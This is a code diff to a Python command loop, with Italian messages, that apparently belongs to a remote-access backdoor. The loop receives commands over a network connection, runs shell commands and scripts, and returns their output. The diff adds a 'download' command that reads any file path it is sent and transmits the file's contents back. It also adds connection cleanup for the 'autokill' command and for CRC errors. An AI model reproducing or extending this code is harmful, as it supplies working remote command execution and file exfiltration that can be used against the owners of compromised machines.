@@ -60,7 +60,21 @@ def service():
                             except:
                                 Connection.SEND("cartella inraggiungibile")
 
+                    elif payload.split(" ")[0] == "download" and len(payload.split()) == 2:
+                        fileopen = False
+                        try:
+                            file = open(payload.split(" ")[1], "rb")
+                            fileopen = True
+                        except:
+                            Connection.SEND("impossibile inviare il file richiesto")
+
+                        if fileopen == True:
+                            content = file.read()
+                            file.close()
+                            Connection.SEND( b'file@' + content)
+
                     elif payload == "autokill":
+                        Connection.CLOSE_CONN()
                         kill = True
                         break
 
@@ -68,6 +82,8 @@ def service():
                         output = Comand.EX_COMMAND(payload)
                         print(output)
                         Connection.SEND(output)
+
+
                 #esegue uno script
                 elif index == "scr":
                     output = Comand.EX_SCRIPT(payload)
@@ -79,6 +95,7 @@ def service():
                 print("errore nel crc32")
                 conn = Connection.SEND("crc32 err")
                 if conn == False:
+                    Connection.CLOSE_CONN()
                     break
     except:
         print("errore connessione...")
